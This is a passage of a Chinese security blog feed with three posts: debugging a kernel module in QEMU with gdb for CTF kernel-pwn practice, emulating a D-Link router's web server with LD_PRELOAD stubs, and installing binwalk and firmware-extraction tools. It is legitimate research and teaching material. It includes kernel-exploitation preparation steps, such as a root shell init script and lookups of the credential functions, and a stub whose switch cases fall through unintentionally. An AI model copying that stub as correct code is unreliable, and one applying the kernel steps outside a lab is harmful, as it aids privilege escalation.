<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ko_test_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ko_test_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Bye Bye~\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure>
<p>添加 <code>Makefile</code> 文件</p>
<figure class="highlight mk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定声称哪些 内核模块</span></span><br><span class="line">obj-m += ko_test.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定内核项目路径</span></span><br><span class="line">KDIR =/home/embeded/Desktop/linux-5.17.5</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">        <span class="comment"># -C 参数指定进入内核项目路径</span></span><br><span class="line">        <span class="comment"># -M 指定驱动源码的环境，使 Makefile 在构建模块之前返回到 驱动源码 目录，并在该目录中生成驱动模块</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>
<p>进行编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5/mydriver$ make</span><br><span class="line">make -C /home/embeded/Desktop/linux-5.17.5/ M=/home/embeded/Desktop/linux-5.17.5/mydriver modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/home/embeded/Desktop/linux-5.17.5&#x27;</span></span><br><span class="line">  CC [M]  /home/embeded/Desktop/linux-5.17.5/mydriver/ko_test.o</span><br><span class="line">  MODPOST /home/embeded/Desktop/linux-5.17.5/mydriver/Module.symvers</span><br><span class="line">  CC [M]  /home/embeded/Desktop/linux-5.17.5/mydriver/ko_test.mod.o</span><br><span class="line">  LD [M]  /home/embeded/Desktop/linux-5.17.5/mydriver/ko_test.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/home/embeded/Desktop/linux-5.17.5&#x27;</span></span><br></pre></td></tr></table></figure>
<p>:warning:  <code>Makefile:9: *** missing separator (did you mean TAB instead of 8 spaces?).  Stop.</code><br>解决办法：vim 打开进行修改</p>
<p>:warning: <code>WARNING: Symbol version dump &quot;Module.symvers&quot; is missing. Modules may not have dependencies or modversions.</code><br>解决方式：回到内核源码目录，执行 <code>make -j 4 modules</code>，在编译模块的过程中，可以看到 <code>GEN     Module.symvers</code>，编译完成后重新编译自定义模块</p>
<p><strong>驱动运行</strong><br>将编译出来的 <code>*.ko</code> 文件复制到 rootfs 文件夹，即 <code>busybox*/_install</code>，修改运行脚本文件，提权运行并挂载模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">+ insmod /ko_test.ko <span class="comment"># 挂载内核模块</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">- setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">+ setsid /bin/cttyhack setuidgid 0 /bin/sh <span class="comment"># 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span><br><span class="line">+ poweroff -f <span class="comment"># 设置 shell 退出后则关闭机器</span></span><br></pre></td></tr></table></figure>
<p>重新打包 <code>rootfs</code> 并运行 <code>qemu</code>，查看 <code>dmesg</code> 信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[    2.159687] ko_test: loading out-of-tree module taints kernel.</span><br><span class="line">[    2.160878] ko_test: module verification failed: signature and/or required key missing - tainting kernel</span><br><span class="line">[    2.165558] This is a <span class="built_in">test</span> ko!</span><br><span class="line">Boot took 2.14 seconds</span><br><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">ko_test 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure>

<p><strong>驱动调试：附加QEMU</strong><br>qemu 拥有调试接口，可以通过指定参数 <code>-gdb tcp::1234</code> 或等价符号 <code>-s</code>，如果希望 qemu 启动后立刻挂起，则需要指定 <code>-S</code></p>
<p>调试内核时为了加载 vmlinux 符号表，需要确保指定 <code>-append &quot;nokaslr&quot;</code>，否则无法给目标函数下断点<br>即模拟命令为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ qemu-system-x86_64 -s -S -nographic -kernel ./linux-5.17.5/arch/x86/boot/bzImage -initrd ./rootfs.img -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 nokaslr&quot;</span> -smp cores=2,threads=1 -cpu kvm64</span><br></pre></td></tr></table></figure>
<p>qemu 启动后另起终端，执行命令 <code>gdb -q -ex &quot;target remote localhost::1234&quot;</code> 即可附加到 QEMU 上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ gdb-gef -q -ex <span class="string">&quot;target remote localhost:1234&quot;</span></span><br></pre></td></tr></table></figure>
<p>通过添加符号表可以给特定函数下断点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  file ./vmlinux</span><br><span class="line">Reading symbols from ./vmlinux...done.</span><br><span class="line">gef➤  b start_kernel</span><br><span class="line">Breakpoint 1 at 0xffffffff831c7d55: file init/main.c, line 929.</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
<p>可以通过以下命令查看内核中的符号信息(加载地址)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line">ffffffff810d8410 T prepare_kernel_cred</span><br><span class="line">ffffffff826eda20 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff82713b4a r __kstrtab_prepare_kernel_cred</span><br><span class="line">ffffffff827189f9 r __kstrtabns_prepare_kernel_cred</span><br><span class="line">/ <span class="comment"># grep commit_creds  /proc/kallsyms</span></span><br><span class="line">ffffffff810d8160 T commit_creds</span><br><span class="line">ffffffff826e5884 r __ksymtab_commit_creds</span><br><span class="line">ffffffff82713b0a r __kstrtab_commit_creds</span><br><span class="line">ffffffff827189f9 r __kstrtabns_commit_creds</span><br><span class="line">/ <span class="comment"># grep ko_test_init  /proc/kallsyms</span></span><br><span class="line">ffffffffc0002000 t ko_test_init	[ko_test]</span><br></pre></td></tr></table></figure>

<p>装载模块和卸载模块的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># insmod mod_name</span></span><br><span class="line">/ <span class="comment"># rmmod mod_name</span></span><br></pre></td></tr></table></figure>

<p><strong>驱动调试：附加驱动</strong><br>在驱动装载进内核之后，首先查看已经加载的模块，并获取驱动加载的基地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">ko_test 16384 0 - Live 0xffffffffc0002000 (OE)</span><br><span class="line">/ <span class="comment"># grep ko_test /proc/modules</span></span><br><span class="line">ko_test 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure>
<p>查看目标内核模块各个 <code>section</code> 的首地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># grep &quot;0x&quot; /sys/module/ko_test/sections/.*</span></span><br><span class="line">/sys/module/ko_test/sections/.gnu.linkonce.this_module:0xffffffffc0004000</span><br><span class="line">/sys/module/ko_test/sections/.note.Linux:0xffffffffc0003054</span><br><span class="line">/sys/module/ko_test/sections/.note.gnu.build-id:0xffffffffc0003000</span><br><span class="line">/sys/module/ko_test/sections/.rodata.str1.1:0xffffffffc0003024</span><br><span class="line">/sys/module/ko_test/sections/.strtab:0xffffffffc0007378</span><br><span class="line">/sys/module/ko_test/sections/.symtab:0xffffffffc0007000</span><br><span class="line">/sys/module/ko_test/sections/.text:0xffffffffc0002000</span><br></pre></td></tr></table></figure>

<p>在 gdb 窗口中加载调试符号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-symbol-file mydrivers/ko_test.ko &lt;ko_test_base_addr&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在此处，命令可以为</span></span><br><span class="line">gef➤  add-symbol-file mydriver/ko_test.ko 0xffffffffc0002000</span><br><span class="line">add symbol table from file <span class="string">&quot;mydriver/ko_test.ko&quot;</span> at</span><br><span class="line">	.text_addr = 0xffffffffc0002000</span><br><span class="line">Reading symbols from mydriver/ko_test.ko...done.</span><br></pre></td></tr></table></figure>

<p><strong>例子：nokaslr</strong><br>这里简单叙述一下调试 ko_test 模块函数的例子<br>首先，启动 QEMU 及 gdb<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061251955.png"><br>读取 vmlinux 符号表并继续执行<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061255929.png"><br>查看是否已经装载模块，及确认模块地址信息<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061302059.png"><br>在 gdb 调试界面按下 Ctrl+C 断下 kernel，并添加 ko_test 符号信息<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061305485.png"><br>在 ko_test 模块函数处下断点<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061307459.png"><br>继续运行 kernel，对 ko_test 进行卸载并重新装填，可以看到 gdb 会在断在模块函数处<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061309841.png"><br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061312650.png"></p>
<p>这里是利用 nokaslr 下相同驱动加载基地址不变的原理进行下断点</p>
<!-- **例子：kaslr**
如何在开始 ``kaslr`` 时调试 ``init`` 函数？
在模块被装填过程中，会调用 ``load_module`` 函数，在其内部会调用 ``do_init_module`` 函数对模块进行初始化,
其中 ``load_module`` 函数对应 SYSCALL 函数的 ``init_module`` 调用 

由于在 kernel 启用时会加载系统模块，先让 kernel 加载完毕，然后 Ctrl+C 断掉并在 ``do_init_module`` 处下断点，该函数前半部分会执行内核模块的 ``init`` 函数
![](https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061331847.png)
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * This is <span class="built_in">where</span> the real work happens.</span><br><span class="line"> *</span><br><span class="line"> * Keep it uninlined to provide a reliable breakpoint target, e.g. <span class="keyword">for</span> the gdb</span><br><span class="line"> * helper <span class="built_in">command</span> <span class="string">&#x27;lx-symbols&#x27;</span>.</span><br><span class="line"> */</span><br><span class="line">static noinline int do_init_module(struct module *mod)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  /* Start the module */</span><br><span class="line">  <span class="keyword">if</span> (mod-&gt;init != NULL)</span><br><span class="line">    ret = do_one_initcall(mod-&gt;init);   // &lt;- 此处执行 ko_test_init 函数</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; 0) &#123;</span><br><span class="line">    goto fail_free_freeinit;</span><br><span class="line">  &#125;</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>放开 kernel，加载模块，可以看到 gdb 断掉 –&gt;</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>QEMU</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>修复路由器程序运行环境</title>
    <url>/2022/05/05/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h2 id="固件信息"><a href="#固件信息" class="headerlink" title="固件信息"></a>固件信息</h2><p>本章以 D-Link DIR-605L（FW_113）路由器为例</p>
<p>下载链接：	<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP">ftp://FTP2.DLINK.COM/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP</a></p>
<p>查看信息，解压并提取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3$ binwalk -e dir605L_FW_113.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">11280         0x2C10          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2129920 bytes</span><br><span class="line">563234        0x89822         Squashfs filesystem, big endian, version 2.0, size: 64160 bytes, 7 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:03:47</span><br><span class="line">628788        0x99834         Squashfs filesystem, big endian, version 2.0, size: 2301312 bytes, 495 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:04:00</span><br></pre></td></tr></table></figure>
<p>查看提取结果，可以看到系统信息存在于 <code>squashfs-root-0</code> 目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3$ tree -L 2 _dir605L_FW_113.bin.extracted/</span><br><span class="line">_dir605L_FW_113.bin.extracted/</span><br><span class="line">├── 2C10</span><br><span class="line">├── 2C10.7z</span><br><span class="line">├── 89822.squashfs</span><br><span class="line">├── 99834.squashfs</span><br><span class="line">├── squashfs-root</span><br><span class="line">│   ├── mydlink-watch-dog.sh</span><br><span class="line">│   ├── opt.local</span><br><span class="line">│   ├── signalc</span><br><span class="line">│   ├── tsa</span><br><span class="line">│   ├── uplog</span><br><span class="line">│   └── version</span><br><span class="line">└── squashfs-root-0</span><br><span class="line">    ├── bin</span><br><span class="line">    ├── dev</span><br><span class="line">    ├── etc</span><br><span class="line">    ├── lib</span><br><span class="line">    ├── mydlink</span><br><span class="line">    ├── proc</span><br><span class="line">    ├── sbin</span><br><span class="line">    ├── tmp -&gt; /dev/null</span><br><span class="line">    ├── usr</span><br><span class="line">    ├── var</span><br><span class="line">    ├── web</span><br><span class="line">    └── web-lang -&gt; /dev/null</span><br></pre></td></tr></table></figure>

<h2 id="尝试运行并修复-Web-服务器程序"><a href="#尝试运行并修复-Web-服务器程序" class="headerlink" title="尝试运行并修复 Web 服务器程序"></a>尝试运行并修复 Web 服务器程序</h2><p>使用 QEMU 进行模拟运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mips-static) .</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static ./bin/boa</span><br><span class="line">Initialize AP MIB failed!</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
<p>可以看到报错，信息为 <code>Initialize AP MIB failed</code>，在 <code>JEB</code> 打开 <code>boa</code> 进行字符串寻找<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051207608.png"><br>无论是根据反汇编进行查看，还是进行反编译查看，都能看到通过 <code>apmib_init</code> 进行初始化<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051225819.png"><br>使用 JEB 查看 <code>apmib.so</code> 中的 <code>apmib_init</code>，正常返回值应为 1<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051230467.png"></p>
<p>因此编写函数进行劫持</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">apmib_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Fake it</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译并再次运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so</span><br><span class="line"></span><br><span class="line">$ embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;/apmib-ld.so&quot;</span> ./bin/boa</span><br><span class="line">Create chklist file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<p>依旧报错，手上没有 IDA 尝试启用动态调试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;/apmib-ld.so&quot;</span> -g 1234 ./bin/boa</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051527711.png"></p>
<p>这里结合 JEB 反汇编能看出来属于 apmib_get，但是其代码功能分析就暂时不做了，整理劫持函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_IP_ADDR 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_HW_VER 0x250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_CAPTCHA 0x2C1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">apmib_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Fake it;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">apmib_get</span><span class="params">(<span class="type">int</span> code, <span class="type">int</span> *value)</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(code)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MIB_HW_VER:</span><br><span class="line">            *value = <span class="number">0xF1</span>;</span><br><span class="line">        <span class="keyword">case</span> MIB_IP_ADDR:</span><br><span class="line">            *value = <span class="number">0x7F000001</span>;</span><br><span class="line">        <span class="keyword">case</span> MIB_CAPTCHA:</span><br><span class="line">            *value = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译执行可以看到，成功运行 boa 程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;/apmib-ld.so&quot;</span> ./bin/boa</span><br><span class="line">Create chklist file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">hard ver is</span><br><span class="line">Create f/w version file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">boa: server version Boa/0.94.14rc21</span><br><span class="line">boa: server built May 25 2012 at 13:03:21.</span><br><span class="line">boa: starting server pid=9326, port 80</span><br><span class="line">Unsupported ioctl: cmd=0x89f0</span><br><span class="line">device ioctl:: Function not implemented</span><br><span class="line">Unsupported ioctl: cmd=0x89f0</span><br><span class="line">device ioctl:: Function not implemented</span><br><span class="line">smart 404 ----------------------------------</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ netstat -an | grep 80</span><br><span class="line">warning, got bogus unix line.</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     </span><br><span class="line">tcp        0      1 192.168.31.110:48678    34.122.121.32:80        SYN_SENT </span><br></pre></td></tr></table></figure>

<p>可以看到 Web 服务器 boa 已经成功运行</p>
]]></content>
      <categories>
        <category>Iot</category>
        <category>路由器</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>QEMU</tag>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式环境搭建</title>
    <url>/2022/05/03/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h1><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h2 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改为中科大源</span></span><br><span class="line"></span><br><span class="line">$ sudo apt install build-essential autoconf <span class="comment"># 配置</span></span><br><span class="line">$ sudo apt install tree jnettop htop <span class="comment"># 查看目录、连接、性能</span></span><br><span class="line">$ sudo apt install proxychains4 net-tools <span class="comment"># 查看配置网络</span></span><br><span class="line">$ sudo apt install git curl wget  <span class="comment"># 下载</span></span><br><span class="line"></span><br><span class="line">$ sudo apt install python3 python3-pip <span class="comment"># python3 环境</span></span><br><span class="line">$ python3 -m pip install --upgrade pip</span><br><span class="line">$ python3 -m pip -V</span><br><span class="line">pip 21.3.1 from /home/embeded/.local/lib/python3.6/site-packages/pip (python 3.6)</span><br></pre></td></tr></table></figure>

<h1 id="软件环境搭建流程"><a href="#软件环境搭建流程" class="headerlink" title="软件环境搭建流程"></a>软件环境搭建流程</h1><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Binwalk wiki 链接：<a href="https://github.com/ReFirmLabs/binwalk/wiki">https://github.com/ReFirmLabs/binwalk/wiki</a></p>
<p>安装参考链接：<a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md">https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line">$ <span class="built_in">cd</span> binwalk</span><br><span class="line">$ sudo python3 setup.py install</span><br><span class="line">...</span><br><span class="line">Installed /usr/local/lib/python3.6/dist-packages/binwalk-2.3.3-py3.6.egg</span><br><span class="line">Processing dependencies <span class="keyword">for</span> binwalk==2.3.3</span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> binwalk==2.3.3</span><br><span class="line"></span><br><span class="line">$ binwalk </span><br><span class="line"></span><br><span class="line">Binwalk v2.3.3</span><br><span class="line">Craig Heffner, ReFirmLabs</span><br><span class="line">https://github.com/ReFirmLabs/binwalk</span><br><span class="line"></span><br><span class="line">Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>依据 Binwalk wiki 所说，其安装依赖只有 python 解释器，其余所有依赖都是可选的运行时依赖，直接按顺序全部安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo python3 -m pip install nose coverage <span class="comment"># 测试/测试覆盖率</span></span><br><span class="line"></span><br><span class="line">$ sudo python3 -m pip install pycryptodome <span class="comment"># 解密知名加密固件</span></span><br><span class="line"></span><br><span class="line">$ sudo apt-get install libqt4-opengl python3-opengl python3-pyqt4 python3-pyqt4.qtopengl python3-numpy python3-scipy</span><br><span class="line">$ sudo python3 -m pip install pyqtgraph <span class="comment"># 生成图及可视化</span></span><br><span class="line"></span><br><span class="line">$ sudo python3 -m pip install capstone <span class="comment"># 反汇编框架 Python-bindings</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 额外的工具自动抽取/解压文件和数据  </span></span><br><span class="line"><span class="comment"># 标准解压工具</span></span><br><span class="line">$ sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsswap squashfs-tools sleuthkit default-jdk lzop srecord</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对非标准 SquashFS 镜像</span></span><br><span class="line">$ sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch</span><br><span class="line">$ (<span class="built_in">cd</span> sasquatch &amp;&amp; ./build.sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对 JFFS2 文件系统</span></span><br><span class="line">$ sudo python3 -m pip install cstruct</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/sviehb/jefferson</span><br><span class="line">$ (<span class="built_in">cd</span> jefferson &amp;&amp; sudo python3 setup.py install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对 UBIFS 文件系统</span></span><br><span class="line">$ sudo apt-get install liblzo2-dev python-lzo</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/jrspruitt/ubi_reader</span><br><span class="line">$ (<span class="built_in">cd</span> ubi_reader &amp;&amp; sudo python3 setup.py install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对 YAFFS 文件系统</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/devttys0/yaffshiv</span><br><span class="line">$ (<span class="built_in">cd</span> yaffshiv &amp;&amp; sudo python3 setup.py install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对 StuffIt 压缩文件</span></span><br><span class="line">$ wget -O - http://downloads.tuxfamily.org/sdtraces/stuffit520.611linux-i386.tar.gz | tar -zxv</span><br><span class="line">$ sudo <span class="built_in">cp</span> bin/unstuff /usr/local/bin/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h3><p>:exclamation: 按照原文安装过程中会报错 <code>E: Unable to locate package cramfsprogs</code> 需要手动安装这个包<br>安装包都可以从 <a href="https://launchpad.net/ubuntu">https://launchpad.net/ubuntu</a> 查找</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget -c https://launchpad.net/ubuntu/+archive/primary/+files/cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br><span class="line">$ sudo dpkg -i cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br></pre></td></tr></table></figure>

<p>【optional】 binwalk plugin for ida in linux</p>
<p>至此 binwalk 算是安装好了，至于使用放在后话吧</p>
